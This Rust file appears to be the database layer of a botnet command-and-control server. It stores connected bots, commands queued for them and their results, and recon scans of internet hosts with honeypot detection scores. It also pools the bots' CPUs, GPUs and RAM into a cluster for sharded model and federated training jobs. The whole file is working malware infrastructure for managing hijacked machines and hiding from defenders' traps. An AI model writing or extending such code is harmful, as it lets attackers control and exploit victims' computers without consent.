use rusqlite::{Connection, params};
use std::sync::Mutex;

use crate::error::C2Error;

pub struct ServerDb {
    conn: Mutex<Connection>,
}

impl ServerDb {
    pub fn open(path: &str) -> Result<Self, C2Error> {
        let conn = Connection::open(path)
            .map_err(|e| C2Error::CommandError(format!("db open: {}", e)))?;
        let db = ServerDb {
            conn: Mutex::new(conn),
        };
        db.init_schema()?;
        Ok(db)
    }

    fn init_schema(&self) -> Result<(), C2Error> {
        let conn = self.conn.lock().unwrap();
        conn.execute_batch(
            "
            CREATE TABLE IF NOT EXISTS bots (
                addr        TEXT PRIMARY KEY,
                first_seen  TEXT NOT NULL DEFAULT (datetime('now')),
                last_seen   TEXT NOT NULL DEFAULT (datetime('now')),
                status      TEXT NOT NULL DEFAULT 'connected',
                node_id     TEXT,
                os          TEXT,
                arch        TEXT
            );

            CREATE TABLE IF NOT EXISTS commands (
                id          INTEGER PRIMARY KEY AUTOINCREMENT,
                bot_addr    TEXT NOT NULL,
                command     TEXT NOT NULL,
                args        TEXT NOT NULL,
                status      TEXT NOT NULL DEFAULT 'queued',
                created_at  TEXT NOT NULL DEFAULT (datetime('now')),
                sent_at     TEXT,
                completed_at TEXT,
                FOREIGN KEY (bot_addr) REFERENCES bots(addr)
            );

            CREATE TABLE IF NOT EXISTS results (
                id          INTEGER PRIMARY KEY AUTOINCREMENT,
                command_id  INTEGER,
                bot_addr    TEXT NOT NULL,
                command     TEXT NOT NULL,
                result      TEXT NOT NULL,
                received_at TEXT NOT NULL DEFAULT (datetime('now')),
                FOREIGN KEY (command_id) REFERENCES commands(id)
            );

            CREATE TABLE IF NOT EXISTS recon_scans (
                scan_id     TEXT PRIMARY KEY,
                requested_by TEXT,
                target_spec TEXT NOT NULL,
                total_targets INTEGER,
                open_ports  INTEGER,
                hosts_found INTEGER,
                honeypots   INTEGER,
                clusters    INTEGER,
                started_at  TEXT NOT NULL DEFAULT (datetime('now')),
                completed_at TEXT,
                status      TEXT NOT NULL DEFAULT 'running'
            );

            CREATE TABLE IF NOT EXISTS recon_hosts (
                ip          TEXT NOT NULL,
                scan_id     TEXT NOT NULL,
                hostname    TEXT,
                asn         INTEGER,
                org         TEXT,
                country     TEXT,
                is_honeypot INTEGER NOT NULL DEFAULT 0,
                honeypot_score REAL,
                services_json TEXT,
                discovered_at TEXT NOT NULL DEFAULT (datetime('now')),
                PRIMARY KEY (ip, scan_id)
            );

            CREATE TABLE IF NOT EXISTS compute_cluster (
                node_id     TEXT PRIMARY KEY,
                bot_addr    TEXT,
                cpu_cores   INTEGER,
                ram_bytes   INTEGER,
                gpu_name    TEXT,
                gpu_vram    INTEGER,
                gpu_flops   REAL,
                net_mbps    REAL,
                reputation  INTEGER NOT NULL DEFAULT 0,
                status      TEXT NOT NULL DEFAULT 'idle',
                last_heartbeat TEXT NOT NULL DEFAULT (datetime('now')),
                FOREIGN KEY (bot_addr) REFERENCES bots(addr)
            );

            CREATE TABLE IF NOT EXISTS compute_jobs (
                job_id      TEXT PRIMARY KEY,
                job_type    TEXT NOT NULL,
                model_id    TEXT,
                status      TEXT NOT NULL DEFAULT 'pending',
                total_nodes INTEGER,
                created_at  TEXT NOT NULL DEFAULT (datetime('now')),
                completed_at TEXT,
                result_summary TEXT
            );

            CREATE TABLE IF NOT EXISTS shard_assignments (
                shard_id    TEXT PRIMARY KEY,
                job_id      TEXT NOT NULL,
                node_id     TEXT NOT NULL,
                layer_start INTEGER,
                layer_end   INTEGER,
                status      TEXT NOT NULL DEFAULT 'pending',
                assigned_at TEXT NOT NULL DEFAULT (datetime('now')),
                FOREIGN KEY (job_id) REFERENCES compute_jobs(job_id),
                FOREIGN KEY (node_id) REFERENCES compute_cluster(node_id)
            );

            CREATE TABLE IF NOT EXISTS federated_rounds (
                job_id      TEXT NOT NULL,
                round       INTEGER NOT NULL,
                participants INTEGER,
                global_loss REAL,
                total_samples INTEGER,
                convergence_delta REAL,
                completed_at TEXT NOT NULL DEFAULT (datetime('now')),
                PRIMARY KEY (job_id, round)
            );

            CREATE INDEX IF NOT EXISTS idx_bots_status ON bots(status);
            CREATE INDEX IF NOT EXISTS idx_commands_bot ON commands(bot_addr);
            CREATE INDEX IF NOT EXISTS idx_commands_status ON commands(status);
            CREATE INDEX IF NOT EXISTS idx_results_bot ON results(bot_addr);
            CREATE INDEX IF NOT EXISTS idx_recon_hosts_ip ON recon_hosts(ip);
            CREATE INDEX IF NOT EXISTS idx_compute_status ON compute_cluster(status);
            "
        ).map_err(|e| C2Error::CommandError(format!("schema init: {}", e)))?;
        Ok(())
    }

    pub fn upsert_bot(&self, addr: &str) -> Result<(), C2Error> {
        let conn = self.conn.lock().unwrap();
        conn.execute(
            "INSERT INTO bots (addr) VALUES (?1)
             ON CONFLICT(addr) DO UPDATE SET last_seen = datetime('now'), status = 'connected'",
            params![addr],
        ).map_err(|e| C2Error::CommandError(format!("upsert bot: {}", e)))?;
        Ok(())
    }

    pub fn disconnect_bot(&self, addr: &str) -> Result<(), C2Error> {
        let conn = self.conn.lock().unwrap();
        conn.execute(
            "UPDATE bots SET status = 'disconnected', last_seen = datetime('now') WHERE addr = ?1",
            params![addr],
        ).map_err(|e| C2Error::CommandError(format!("disconnect bot: {}", e)))?;
        Ok(())
    }

    pub fn insert_command(&self, bot_addr: &str, command: &str, args: &[String]) -> Result<i64, C2Error> {
        let conn = self.conn.lock().unwrap();
        let args_json = serde_json::to_string(args).unwrap_or_default();
        conn.execute(
            "INSERT INTO commands (bot_addr, command, args) VALUES (?1, ?2, ?3)",
            params![bot_addr, command, args_json],
        ).map_err(|e| C2Error::CommandError(format!("insert command: {}", e)))?;
        Ok(conn.last_insert_rowid())
    }

    pub fn mark_command_sent(&self, id: i64) -> Result<(), C2Error> {
        let conn = self.conn.lock().unwrap();
        conn.execute(
            "UPDATE commands SET status = 'sent', sent_at = datetime('now') WHERE id = ?1",
            params![id],
        ).map_err(|e| C2Error::CommandError(format!("mark sent: {}", e)))?;
        Ok(())
    }

    pub fn insert_result(&self, command_id: Option<i64>, bot_addr: &str, command: &str, result: &str) -> Result<(), C2Error> {
        let conn = self.conn.lock().unwrap();
        conn.execute(
            "INSERT INTO results (command_id, bot_addr, command, result) VALUES (?1, ?2, ?3, ?4)",
            params![command_id, bot_addr, command, result],
        ).map_err(|e| C2Error::CommandError(format!("insert result: {}", e)))?;

        if let Some(cid) = command_id {
            conn.execute(
                "UPDATE commands SET status = 'completed', completed_at = datetime('now') WHERE id = ?1",
                params![cid],
            ).map_err(|e| C2Error::CommandError(format!("complete command: {}", e)))?;
        }
        Ok(())
    }

    pub fn upsert_compute_node(
        &self,
        node_id: &str,
        bot_addr: Option<&str>,
        cpu_cores: u32,
        ram_bytes: u64,
        gpu_name: Option<&str>,
        gpu_vram: Option<u64>,
        gpu_flops: Option<f64>,
        net_mbps: f64,
        reputation: i32,
    ) -> Result<(), C2Error> {
        let conn = self.conn.lock().unwrap();
        conn.execute(
            "INSERT INTO compute_cluster
             (node_id, bot_addr, cpu_cores, ram_bytes, gpu_name, gpu_vram, gpu_flops, net_mbps, reputation)
             VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8, ?9)
             ON CONFLICT(node_id) DO UPDATE SET
                bot_addr = ?2, cpu_cores = ?3, ram_bytes = ?4, gpu_name = ?5,
                gpu_vram = ?6, gpu_flops = ?7, net_mbps = ?8, reputation = ?9,
                last_heartbeat = datetime('now')",
            params![
                node_id,
                bot_addr,
                cpu_cores as i64,
                ram_bytes as i64,
                gpu_name,
                gpu_vram.map(|v| v as i64),
                gpu_flops,
                net_mbps,
                reputation,
            ],
        ).map_err(|e| C2Error::CommandError(format!("upsert compute: {}", e)))?;
        Ok(())
    }

    pub fn get_cluster_nodes(&self, min_reputation: i32) -> Result<Vec<ClusterNode>, C2Error> {
        let conn = self.conn.lock().unwrap();
        let mut stmt = conn.prepare(
            "SELECT node_id, bot_addr, cpu_cores, ram_bytes, gpu_name, gpu_vram, gpu_flops, net_mbps, reputation, status
             FROM compute_cluster
             WHERE reputation >= ?1 AND last_heartbeat > datetime('now', '-10 minutes')
             ORDER BY gpu_flops DESC NULLS LAST, ram_bytes DESC"
        ).map_err(|e| C2Error::CommandError(format!("query: {}", e)))?;

        let nodes = stmt.query_map(params![min_reputation], |row| {
            Ok(ClusterNode {
                node_id: row.get(0)?,
                bot_addr: row.get(1)?,
                cpu_cores: row.get::<_, i64>(2)? as u32,
                ram_bytes: row.get::<_, i64>(3)? as u64,
                gpu_name: row.get(4)?,
                gpu_vram: row.get::<_, Option<i64>>(5)?.map(|v| v as u64),
                gpu_flops: row.get(6)?,
                net_mbps: row.get(7)?,
                reputation: row.get(8)?,
                status: row.get(9)?,
            })
        }).map_err(|e| C2Error::CommandError(format!("query: {}", e)))?
          .filter_map(|r| r.ok())
          .collect();

        Ok(nodes)
    }

    pub fn insert_compute_job(&self, job_id: &str, job_type: &str, model_id: Option<&str>, total_nodes: usize) -> Result<(), C2Error> {
        let conn = self.conn.lock().unwrap();
        conn.execute(
            "INSERT OR REPLACE INTO compute_jobs (job_id, job_type, model_id, total_nodes) VALUES (?1, ?2, ?3, ?4)",
            params![job_id, job_type, model_id, total_nodes as i64],
        ).map_err(|e| C2Error::CommandError(format!("insert job: {}", e)))?;
        Ok(())
    }

    pub fn bot_count(&self) -> Result<usize, C2Error> {
        let conn = self.conn.lock().unwrap();
        let count: i64 = conn.query_row(
            "SELECT COUNT(*) FROM bots WHERE status = 'connected'",
            [],
            |row| row.get(0),
        ).map_err(|e| C2Error::CommandError(format!("query: {}", e)))?;
        Ok(count as usize)
    }

    pub fn cluster_summary(&self) -> Result<ClusterSummary, C2Error> {
        let conn = self.conn.lock().unwrap();

        let total_nodes: i64 = conn.query_row(
            "SELECT COUNT(*) FROM compute_cluster WHERE last_heartbeat > datetime('now', '-10 minutes')",
            [], |row| row.get(0),
        ).map_err(|e| C2Error::CommandError(format!("query: {}", e)))?;

        let gpu_nodes: i64 = conn.query_row(
            "SELECT COUNT(*) FROM compute_cluster WHERE gpu_name IS NOT NULL AND last_heartbeat > datetime('now', '-10 minutes')",
            [], |row| row.get(0),
        ).map_err(|e| C2Error::CommandError(format!("query: {}", e)))?;

        let total_ram: i64 = conn.query_row(
            "SELECT COALESCE(SUM(ram_bytes), 0) FROM compute_cluster WHERE last_heartbeat > datetime('now', '-10 minutes')",
            [], |row| row.get(0),
        ).map_err(|e| C2Error::CommandError(format!("query: {}", e)))?;

        let total_vram: i64 = conn.query_row(
            "SELECT COALESCE(SUM(gpu_vram), 0) FROM compute_cluster WHERE gpu_vram IS NOT NULL AND last_heartbeat > datetime('now', '-10 minutes')",
            [], |row| row.get(0),
        ).map_err(|e| C2Error::CommandError(format!("query: {}", e)))?;

        let total_flops: f64 = conn.query_row(
            "SELECT COALESCE(SUM(gpu_flops), 0) FROM compute_cluster WHERE gpu_flops IS NOT NULL AND last_heartbeat > datetime('now', '-10 minutes')",
            [], |row| row.get(0),
        ).map_err(|e| C2Error::CommandError(format!("query: {}", e)))?;

        Ok(ClusterSummary {
            total_nodes: total_nodes as usize,
            gpu_nodes: gpu_nodes as usize,
            total_ram_bytes: total_ram as u64,
            total_vram_bytes: total_vram as u64,
            total_flops,
        })
    }
}

#[derive(Debug, Clone)]
pub struct ClusterNode {
    pub node_id: String,
    pub bot_addr: Option<String>,
    pub cpu_cores: u32,
    pub ram_bytes: u64,
    pub gpu_name: Option<String>,
    pub gpu_vram: Option<u64>,
    pub gpu_flops: Option<f64>,
    pub net_mbps: Option<f64>,
    pub reputation: i32,
    pub status: String,
}

#[derive(Debug, Clone, serde::Serialize)]
pub struct ClusterSummary {
    pub total_nodes: usize,
    pub gpu_nodes: usize,
    pub total_ram_bytes: u64,
    pub total_vram_bytes: u64,
    pub total_flops: f64,
}
